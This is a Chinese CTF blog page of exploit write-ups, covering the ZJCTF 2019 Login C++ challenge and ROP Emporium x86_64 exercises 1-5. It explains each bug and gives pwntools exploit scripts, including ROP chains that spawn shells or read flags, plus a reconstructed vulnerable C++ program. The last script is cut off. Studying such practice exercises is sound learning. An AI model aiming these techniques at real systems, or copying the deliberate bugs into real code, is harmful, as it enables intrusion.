<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29467</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">io.sendline(cyclic(<span class="number">24</span>+<span class="number">4</span>) + p32(<span class="number">0x8048529</span>) + p32(<span class="number">0x8048670</span>))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu053-zjctf-2019login"><a class="markdownIt-Anchor" href="#buu053-zjctf-2019login"></a> buu053-[ZJCTF 2019]Login</h1>
<p>第一道C++ pwn题。这也是我第一次认真在做一道C++ pwn的题目。<br />
当然首先，我们需要会逆向C<ins>程序。C</ins>是C的超集，有很多C中没有的东西。其中最为重要的就是类与对象的识别了。<br />
在这一题中，程序的符号表貌似没有被删除，我们可以看到IDA为我们分析出来的各种函数名与类名称。<br />
<img src="https://img-blog.csdnimg.cn/71aff38bece04a26a36e2d9a3e1ff1e3.png" alt="" /><br />
其中容易发现程序中定义了两个类：User和Admin，而且似乎有三个main中定义的lambda函数。</p>
<p>程序中无法查看User类的具体结构，因此我们需要手动创建User类结构体，在IDA的Structures窗口中定义：Ins快捷键创建结构体，Del删除结构体，D/A/*创建结构体成员（常用D），N修改成员名，U删除成员。如下图：（具体为什么要这样定义看下面的分析）<br />
<img src="https://img-blog.csdnimg.cn/f746484ce3754ae7b30226894ed46457.png" alt="" /></p>
<p>通过User类的构造函数发现，构造函数在User，User+8，User+0x58处进行了赋值操作，这里的后面两个均是使用strncpy函数赋值，因此判断是字符串。第一个声明赋值指向的是这样一个结构，有两个函数指针，判断是User类的虚函数表，因为C++类的虚函数表通常都是放在类的最开头位置。可以看到User类中定义了两个虚函数get_password和shell。使用快捷键Y可以修改参数的类型，修改为合适的类型之后，反汇编出来的代码中就不会有一大堆强制转型了，看上去舒服很多。<br />
<img src="https://img-blog.csdnimg.cn/7cb4c23ae1e5418a82e63d8cc84d1b11.png" alt="" /><br />
又通过User类的get_password方法可以判断出后面两个大小为0x50的字符串中到底哪个是用户名哪个是密码。使用快捷键N可以修改参数或变量的名字，修改之后的User类构造函数如下图：<br />
<img src="https://img-blog.csdnimg.cn/bf6791a8aeb14847909ccaef41b8f23e.png" alt="" /><br />
另外，在main函数中发现了login变量，其属于User类，且位于bss段中，判断是User类全局变量对象。我们将bss段中的这个对象修改类型发现大小正好符合，说明我们之前定义的User类结构是正确的。<br />
<img src="https://img-blog.csdnimg.cn/bf45dcdd71764f459b5edd1810b1fd6f.png" alt="" /><br />
<img src="https://img-blog.csdnimg.cn/cd88c318d7ee4385a4e21b7ed411a321.png" alt="" /><br />
再看一下Admin类的构造函数，发现其调用了User类的构造函数，因此判断Admin类是User类的子类。<br />
<img src="https://img-blog.csdnimg.cn/63e222cebc324b75a52166d4b5f3ac64.png" alt="" /><br />
从Admin类虚函数表中含有User类函数也可以说明Admin类是User的子类，且Admin类覆写了User类的shell方法，打开发现User类的shell没有任何作用，而Admin类的shell方法就是直接执行’/bin/sh’，是一个后门。而get_password类没有覆写，在User类中仅仅是用了virtual声明而已。<br />
<img src="https://img-blog.csdnimg.cn/7ef08d5aec4f4fabac0726c69a330ec6.png" alt="" /><br />
现在，我们已经将程序中主要的类、对象分析完毕，main函数的前半部分我们可以读懂了。<br />
<img src="https://img-blog.csdnimg.cn/da71226d729c4aaeb2e5419d62a3c347.png" alt="" /><br />
在main函数中，实例化了一个Admin对象，用户名为admin，密码为2jctf_pa5sw0rd。然后接受用户的输入设置全局User类对象的用户名和密码。</p>
<p>然后main函数用lambda函数做了一些什么事情，我们进入password_checker的某个函数看一下。<br />
<img src="https://img-blog.csdnimg.cn/173d05bbcc0e4410b2b2d4e165316c8c.png" alt="" /><br />
这个函数进行密码输入的比较，如果输入密码正确就执行exec函数指针指向的函数。<br />
根据这个函数的声明，推测password_checker应该是一个结构体，其中包含了后面的lambda函数（注意这个函数应该是一个定义于password_checker结构体中的lambda函数，注意password_checker与lambda函数之间是以::连接）<br />
<img src="https://img-blog.csdnimg.cn/5f1b656e104a4a95be5983efb53a5508.png" alt="" /><br />
在password_checker函数中发现了checker结构体的赋值操作，password_checker中只有这一个函数指针存在。<br />
<img src="https://img-blog.csdnimg.cn/c5e6c8ec278b4fec94deef62617b8ee4.png" alt="" /><br />
因此这一段代码原本的作用是：检查密码是否输入正确，如果正确则执行greeting_func函数：<br />
<img src="https://img-blog.csdnimg.cn/efc3384eb0684838a1af617e3a303d17.png" alt="" /><br />
但是经过实地运行发现，在lambda函数中会发生段错误，错就错在exec函数指针上。原本指针的值应为0x400A90，但是执行到这里的时候发现已经被改成了0x400090。<br />
<img src="https://img-blog.csdnimg.cn/af41c306274c4102920ff3da574a1184.jpeg" alt="" /><br />
进一步跟踪调试发现，是strip_newline函数自动识别换行符（ASCII码为0xA），然后给这个地址错误地修改了，变成了一个无效的值。</p>
<p>这给了我们提示：strip_newline是在lambda函数中调用的，但是却能够修改exec函数的地址，通过调试我们不难发现，exec是一个指针，通过main函数调用password_checker函数获取，但是这是password_checker的局部变量，其地址应该在main函数栈帧的低地址处（main函数实际上没有栈帧，这里类比其他函数的栈帧方便理解），也就是main函数执行时esp的低地址处，而调用其他函数时这里的地址自然就有可能会受到影响。由此可见，如果我们输入密码的时候修改这里的地址值到Admin类的shell函数地址，就能够拿到shell了。</p>
<p>因此，本题的漏洞点在于返回局部变量的值，属于逻辑错误。子函数返回到父函数的返回值不应该是子函数局部变量的值。漏洞本身不难，但是对于逆向C++而言还是一次很好的训练与学习。</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26270</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;admin&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;2jctf_pa5sw0rd\x00\x00&#x27;</span> + p64(<span class="number">0x400E88</span>) * <span class="number">8</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<p>尝试使用CLion还原出程序的源代码：（C++基础不扎实，尽量还原）</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">strip_newline</span><span class="params">(<span class="type">char</span>* buf, <span class="type">int64_t</span> length)</span></span>&#123;</span><br><span class="line">    <span class="type">char</span>* i;</span><br><span class="line">    <span class="keyword">for</span>(i = &amp;buf[length]; i &gt;= buf; i--)&#123;</span><br><span class="line">        <span class="keyword">if</span> ( *i == <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">            *i = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">char</span> username[<span class="number">0x50</span>]&#123;&#125;;</span><br><span class="line">    <span class="type">char</span> password[<span class="number">0x50</span>]&#123;&#125;;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">User</span>()&#123;&#125;</span><br><span class="line">    <span class="built_in">User</span>(<span class="type">const</span> <span class="type">char</span>* username, <span class="type">const</span> <span class="type">char</span>* password)&#123;</span><br><span class="line">        <span class="built_in">strncpy</span>(<span class="keyword">this</span>-&gt;username, username, <span class="number">0x50</span>);</span><br><span class="line">        <span class="built_in">strncpy</span>(<span class="keyword">this</span>-&gt;password, password, <span class="number">0x50</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">read_name</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="type">char</span> name[<span class="number">80</span>];</span><br><span class="line">        <span class="built_in">fgets</span>(name, <span class="number">79</span>, stdin);</span><br><span class="line">        <span class="built_in">strip_newline</span>(name, <span class="number">80</span>);</span><br><span class="line">        <span class="built_in">strncpy</span>(<span class="keyword">this</span>-&gt;username, name, <span class="number">0x50</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">read_password</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="type">char</span> pwd[<span class="number">80</span>];</span><br><span class="line">        <span class="built_in">fgets</span>(pwd, <span class="number">79</span>, stdin);</span><br><span class="line">        <span class="built_in">strip_newline</span>(pwd, <span class="number">80</span>);</span><br><span class="line">        <span class="built_in">strncpy</span>(<span class="keyword">this</span>-&gt;password, pwd, <span class="number">0x50</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">char</span>* <span class="title">get_password</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;No shell for you!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Admin</span> : User&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Admin</span>(<span class="type">const</span> <span class="type">char</span>* username, <span class="type">const</span> <span class="type">char</span>* password) : <span class="built_in">User</span>(username, password)&#123;&#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">shell</span><span class="params">()</span> <span class="keyword">override</span></span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Congratulations!&quot;</span>);</span><br><span class="line">        <span class="built_in">system</span>(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">char</span>* <span class="title">get_password</span><span class="params">()</span> <span class="keyword">override</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> User::<span class="built_in">get_password</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">checker</span>&#123;</span><br><span class="line">    <span class="built_in">void</span> (*check)();</span><br><span class="line">    <span class="type">int64_t</span> null[<span class="number">2</span>];</span><br><span class="line">&#125;checker;</span><br><span class="line"></span><br><span class="line"><span class="function">checker* <span class="title">password_checker</span><span class="params">(<span class="type">void</span> (*check)())</span></span>&#123;</span><br><span class="line">    checker checker;</span><br><span class="line">    checker.check = check;</span><br><span class="line">    <span class="keyword">return</span> &amp;checker;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">User login;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> admin_password[<span class="number">88</span>];</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Hello, World!&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="built_in">setbuf</span>(stdout, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(admin_password, <span class="string">&quot;2jctf_pa5sw0rd&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(&amp;admin_password[<span class="number">15</span>], <span class="number">0</span>, <span class="number">65</span>);</span><br><span class="line">    <span class="function">Admin <span class="title">admin</span><span class="params">((<span class="type">const</span> <span class="type">char</span>*)<span class="string">&quot;admin&quot;</span>, admin_password)</span></span>;</span><br><span class="line">    <span class="built_in">puts</span>(</span><br><span class="line">            <span class="string">&quot; _____   _  ____ _____ _____   _                _       \n&quot;</span></span><br><span class="line">            <span class="string">&quot;|__  /  | |/ ___|_   _|  ___| | |    ___   __ _(_)_ __  \n&quot;</span></span><br><span class="line">            <span class="string">&quot;  / /_  | | |     | | | |_    | |   / _ \\ / _` | | &#x27;_ \\ \n&quot;</span></span><br><span class="line">            <span class="string">&quot; / /| |_| | |___  | | |  _|   | |__| (_) | (_| | | | | |\n&quot;</span></span><br><span class="line">            <span class="string">&quot;/____\\___/ \\____| |_| |_|     |_____\\___/ \\__, |_|_| |_|\n&quot;</span></span><br><span class="line">            <span class="string">&quot;                                          |___/         &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please enter username: &quot;</span>);</span><br><span class="line">    login.<span class="built_in">read_name</span>();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please enter password: &quot;</span>);</span><br><span class="line">    <span class="keyword">auto</span> greeting_func = []()-&gt;<span class="type">void</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&lt;===Welcome to ZJCTF!!!===&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> login.<span class="built_in">shell</span>();</span><br><span class="line">    &#125;;</span><br><span class="line">    checker* exec = <span class="built_in">password_checker</span>(greeting_func);</span><br><span class="line">    login.<span class="built_in">read_password</span>();</span><br><span class="line">    <span class="type">char</span>* admin_pwd = admin.<span class="built_in">get_password</span>();</span><br><span class="line">    <span class="type">char</span>* user_pwd = login.<span class="built_in">get_password</span>();</span><br><span class="line">    [](checker* exec, <span class="type">char</span>* admin_pwd, <span class="type">char</span>* user_pwd)-&gt;<span class="type">void</span>&#123;</span><br><span class="line">        <span class="type">char</span> s[<span class="number">88</span>];</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(admin_pwd, user_pwd))&#123;</span><br><span class="line">            <span class="built_in">snprintf</span>(s, <span class="number">0x50</span>uLL, <span class="string">&quot;Password accepted: %s\n&quot;</span>, s);</span><br><span class="line">            <span class="built_in">puts</span>(s);</span><br><span class="line">            exec-&gt;<span class="built_in">check</span>();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;Nope!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;(exec, admin_pwd, user_pwd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/ROP-Emporium-x86-64-1-6%E9%A2%98/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's Pwnhome">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/ROP-Emporium-x86-64-1-6%E9%A2%98/" class="post-title-link" itemprop="url">ROP Emporium x86_64 1~6题</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-02-28 22:28:10 / Modified: 22:54:19" itemprop="dateCreated datePublished" datetime="2023-02-28T22:28:10+08:00">2023-02-28</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-ups/" itemprop="url" rel="index"><span itemprop="name">write-ups</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>ROP Emporium是一个提供ROP攻击学习样板程序的网站，一共8道题，每道题有64位、32位、ARM、MIPS共4种格式的ELF文件，适用于多种平台，难度依次递增。本文档为前6道题的x86_64位版本的解析。</p>
<p><a target="_blank" rel="noopener" href="https://ropemporium.com/index.html">ROP Emporium</a></p>
<h1 id="1-ret2win"><a class="markdownIt-Anchor" href="#1-ret2win"></a> 1. ret2win</h1>
<p>这个没什么好说的，新手第一题水平，直接改返回地址就行。</p>
<p>payload:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./ret2win&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, cyclic(<span class="number">40</span>) + p64(<span class="number">0x400756</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="2-split"><a class="markdownIt-Anchor" href="#2-split"></a> 2. split</h1>
<p>这道题需要调用system函数，传入正确的参数。参数在数据段已经给出，直接使用经典gadget将参数pop到rdi寄存器中即可。rdi是64位linux程序函数的第一个参数，前6个参数分别为：rdi, rsi, rdx, rcx, r8, r9，之后的参数在栈中高地址处依次保存。</p>
<p>payload:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./split&#x27;</span>)</span><br><span class="line"></span><br><span class="line">useful_string = <span class="number">0x601060</span></span><br><span class="line">pop_rdi_ret_addr = <span class="number">0x4007c3</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./split&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">32</span> + <span class="number">8</span>) + p64(pop_rdi_ret_addr) + p64(useful_string) + p64(elf.plt[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="3-callme"><a class="markdownIt-Anchor" href="#3-callme"></a> 3. callme</h1>
<p>这道题需要调用自定义库中的三个函数，这3个函数首先都对传入的前三个参数进行了检查。我们只需要在ROP里面将参数传进去即可。</p>
<p>payload:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./callme&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./callme&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rdi = <span class="number">0x4009a3</span></span><br><span class="line">rsirdx = <span class="number">0x40093d</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">32</span> + <span class="number">8</span>)</span><br><span class="line">payload += p64(rdi) + p64(<span class="number">0xdeadbeefdeadbeef</span>)</span><br><span class="line">payload += p64(rsirdx) + p64(<span class="number">0xcafebabecafebabe</span>) + p64(<span class="number">0xd00df00dd00df00d</span>)</span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;callme_one&#x27;</span>])</span><br><span class="line">payload += p64(rdi) + p64(<span class="number">0xdeadbeefdeadbeef</span>)</span><br><span class="line">payload += p64(rsirdx) + p64(<span class="number">0xcafebabecafebabe</span>) + p64(<span class="number">0xd00df00dd00df00d</span>)</span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;callme_two&#x27;</span>])</span><br><span class="line">payload += p64(rdi) + p64(<span class="number">0xdeadbeefdeadbeef</span>)</span><br><span class="line">payload += p64(rsirdx) + p64(<span class="number">0xcafebabecafebabe</span>) + p64(<span class="number">0xd00df00dd00df00d</span>)</span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;callme_three&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="4-write4"><a class="markdownIt-Anchor" href="#4-write4"></a> 4. write4</h1>
<p>这一题虽然有一个print_file函数，但是对应的参数在write4文件中没有给出，需要我们自己构造。仔细使用IDA观察会发现，程序特地给了我们一个gadget实现任意地址写。bss段或data段能够作为我们构造的字符串’flag.txt’的存放位置，那么我们就将这个字符串写到这些可写段中，再将其作为参数传入print_file函数即可。</p>
<p>payload:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./write4&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./write4&#x27;</span>)</span><br><span class="line">useful_gadget = <span class="number">0x400628</span></span><br><span class="line">r14r15 = <span class="number">0x400690</span></span><br><span class="line">rdi = <span class="number">0x400693</span></span><br><span class="line">write_addr = <span class="number">0x601028</span></span><br><span class="line">main_addr = <span class="number">0x400607</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">32</span> + <span class="number">8</span>)</span><br><span class="line">payload += p64(r14r15) + p64(write_addr) + <span class="string">b&#x27;flag.txt&#x27;</span></span><br><span class="line">payload += p64(useful_gadget)</span><br><span class="line">payload += p64(r14r15) + p64(write_addr + <span class="number">8</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(useful_gadget)</span><br><span class="line">payload += p64(rdi) + p64(write_addr)</span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;print_file&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="5-badchars"><a class="markdownIt-Anchor" href="#5-badchars"></a> 5. badchars</h1>
<p>这道题的pwnme函数中添加了一个检查，不允许出现’x’、‘a’、‘g’、'.'这4个字符。但是程序中给出了任一地址加减的gadget，我们先写入其他值，然后通过加减将这个值变成我们想要的值就可以了。但是这里需要注意一点：如果在data段的开头——0x601028写入，程序会崩溃。因为我们需要绕过’x’字符，就势必在应该写入x的地方一开始不能写入x。如果在此处写字符串，那么字符’x’的位置应该在0x60102E，但是 <strong>2E正好是’.'的ASCII码，会被强制转换，从而导致ROP失败。</strong> 不过我们还是可以在0x601030写入。</p>
<p>这里提供一个ROP调试的省时小技巧。当我们构造的ROP多次失败时，如果这个ROP是一次注入，那么我们是无法进行调试的。这种情况下我们可以在ROP中间插入一个有反馈的代码段地址，如main函数开头。我们将这个main函数开头插入到ROP的不同位置，从前往后查找，前面的ROP如果正常执行，那么我们可以及时地得到反馈，如果错误则会崩溃，我们就会知道哪一步ROP之前出了错误。如此从前往后，我们就可以找到，到底是哪一步ROP有问题，从而进行修改。</p>
<p>payload:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./badchars&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./badchars&#x27;</span>)</span><br><span class="line"></span><br><span class="line">xor_r14r15 = <span class="number">0x400628</span></span><br><span class="line">add_r14r15 = <span class="number">0x40062c</span></span><br><span class="line">sub_r14r15 = <span class="number">0x400630</span></span><br><span class="line">mov_r12r13 = <span class="number">0x400634</span></span><br><span class="line">pop_r12r13r14r15 = <span class="number">0x40069c</span></span><br><span class="line">pop_r14r15 = <span class="number">0x4006a0</span></span><br><span class="line">pop_rdi = <span class="number">0x4006a3</span></span><br><span class="line">write_addr = <span class="number">0x601030</span></span><br><span class="line"></span><br><span class="line">badchars = <span class="string">&#x27;xga.&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = <span 